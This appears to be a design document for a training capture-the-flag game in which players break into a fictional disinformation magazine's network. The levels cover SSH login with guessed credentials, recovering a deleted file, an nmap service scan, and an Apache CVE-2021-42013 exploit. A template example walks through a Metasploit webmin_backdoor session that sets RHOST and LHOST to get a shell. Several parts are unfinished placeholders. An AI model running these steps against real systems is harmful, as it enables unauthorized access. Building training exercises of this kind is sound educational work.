# StopThePropaganda

You are a member of a technically proficient group of people fighting the disinformation scene. You gathered information from your secret source about disinformation web magazine ‘Hladné Správy’. From the information, you found out that this magazine has obtained documents containing a load of false information and one unnamed country's government provided these documents. On top of that, this country reportedly paid the magazine to release the information all over the internet as true articles and that is why we need to stop them and hand the documents to authorities. 
We found out the exact location of the magazine's offices and your task is to go there and get access to those incriminating documents in their network. Go there when the offices are empty and try not to get exposed. The best way would be to get to the chief editor's computer, but he takes it home with him. However, his secretary probably doesn't. Start there and good luck. 


## Level 1: Get access 

**Objective**:

The player should get access to secretary computer using SSH.

---
---

**Task assignment**:

As you probably know, most of the attacks start with gathering some information about the victim and does not have to happen online. If you have access to the victim’s trash cans or their table where they sit, there may be some valuable pieces of information. 

When this is not possible, social media or blogging websites are also options where you can find hobbies or other compromising info on the victim. But I have a feeling you do not need this type of information.

When you came to the offices, the building was locked and the only possible entrance you found was the window right next to the cheif editors secretary table. You cannot physically access her computer but it looks like it is turned on. Once you gather some information, you can start with getting the remote access to the computer of the secretary. Maybe access through the terminal will be sufficient, but you will definitely need login and password. After successful connection use aquired password as the flag.
 
**Hints**:

Hint 1 (What tool to use?): Use the command-line  **ssh**. Type `ssh --help` for more info.

Hint 2 (What login to use?): Use the first and last name of the secretary (in lowercase) as login and password

**Solution**:
ssh valeria:user -p #type "ivanovna" as password

**Flag value**:

ivanovna

---
---

**Estimated duration**:

7 minutes

**Learning outcomes**:

That reconnaissance is important part of hacking and you don't always have to use computer to discover useful information. And also basic knowledge about ssh command.

## Level 2: Find that file

**Objective**:

Find the secret file in the file system. It's a text file in Trash folder.

---
---

**Task assignment**:

Valeria received an email with secret information in the attachment. When you receive secret instructions, after reading you should probably delete them, right? However, is deleted file lost forever? Find the (not yet published) secret file and use it's name as a flag.

**Hints**:

Hint 1 (Where to look): Deleted files are moved to Trash folder. It's located at /home/valeria/.local/share/Trash.

Hint 2 (Which file?): Filename is attachment1.txt

**Solution**:

```
cd /home/valeria/.local/share/Trash/files/
ls
cat attachment1.txt
```

**Flag value**:

`filemane of secret file stored on server`

---
---

**Estimated duration**:

5 minutes

**Learning outcomes**:

Searching for files via linux terminal. Discovering specific folders like the Trash.

## Level 3: Scan the network

**Objective**:

The task is to find the machine with a running web server. Use nmap and find a running web server.

---
---

**Task assignment**:
You already got into the computer of Ms. Valeria and found some useful information about files stored on some server. 

Your task is to find the machine with a running web server. Use some scanning tool and look for specific services running on specific ports.

As a flag, submit the name and version of service running on the web server.

**Hints**:

Hint 1 (What to look for?): Web servers usually run on port 80, try looking for that.

Hint 2 (What tool to use?): Use the command-line tool **nmap**.

Hint 3 (What else?): Try to find a right option to run nmap with, that enables detection of services versions.

Hint 4 (What range to use?): Have you heard about CIDR Notation? It can save you some time if you use subnet mask /24 as it does not scan all adreses.


**Solution**:
***#TODO***
```
root@attacker:~#  nmap -sV
Look for port 80 in the output
    ---
    tcp/80
    tcp/22

```

**Flag value**
`Apache 2.4.50`

---
---

**Estimated duration**:

10 minutes

**Learning outcomes** 
The player learns how to scan the network to discover its structure and various running services.


## Level 4: Exploit the server

**Objective** (*visible only to the designer, never to the player*):

Use the exploit to get access to the servers filesystem and find the secret file in the folder from task 2. 

---
---

**Task assignment** (*visible to the player*):

You found the IP address of the computer where Apache server is running. I think I read somewhere about some Apache server vulnerabilities. I think its name was [CVE-2021-42013](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-42013). To exploit this vulnerability you will need a script. You have one prepared in Downloads folder. Then you need to find the file that name you discovered from the deleted file in Valerias computer.

**Hints** (*visible to the player if requested*):

Hint 1 (Where to find more info?): https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-42013

**Solution** (*visible to the player if requested*):

***#TODO***


**Flag value** (*visible to the player if they solve the level*):

`model name (you'll understand, when you find it)`

---
---

**Estimated duration** (*visible only to the designer, never to the player*):

[Number] minutes (for the average player to complete the level)

**Learning outcomes** (*visible only to the designer, never to the player*):
Learn about vulnerabilities (CVE) and that you can exploit them easily.

---
---

# Level template

## Level X: [Title of the level]

**Objective** (*visible only to the designer, never to the player*):

One sentence about the goal of the level. Answers the question "What should the player achieve in the level?"

The objective helps the designers and reviewers of the game design to gain a quick overview of the level.

Example: Scan the server to discover its open ports.

---
---

**Task assignment** (*visible to the player*):

Here, briefly describe the text that the player will see as the assignment.

This includes the description of the flag format.

Example:
You have acquired an IP address of a mysterious server: `172.18.1.5`. Scan it to find its open ports.
As a flag, submit the highest number of an open port.

**Hints** (*visible to the player if requested*):

Write down one or more hints to help the player if (s)he gets stuck during the level.

Each hint has a description and content.

Format: Hint [Number] ([Description]): [Content]

Example: Hint 1 (What tool to use?): Use the command-line tool **nmap**. Type `nmap --help` for more info.

**Solution** (*visible to the player if requested*):

A step-by-step description of the commands the player has to execute to complete the level.

Example:
```
root@attacker:~#  msfconsole
msf5 > search webmin
msf5 > use exploit/unix/webapp/webmin_backdoor
msf5 > show options
msf5 > set RHOST 172.18.1.5
msf5 > set LHOST 10.1.135.83
msf5 > set RPORT 10000
msf5 > check
msf5 > exploit
After this a new ssh session was created.
cd /root/
cat WARNING-READ-ME.txt
The flag is 25790
```

**Flag value** (*visible to the player if they solve the level*):

What should the player discover after successfully solving the level:

[Sdilejte az to smazou!]

Example: CVE-2019-15107

---
---

**Estimated duration** (*visible only to the designer, never to the player*):

[Number] minutes (for the average player to complete the level)

**Learning outcomes** (*visible only to the designer, never to the player*):

## License
***#TODO***
This work by [your names] is licensed under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0).

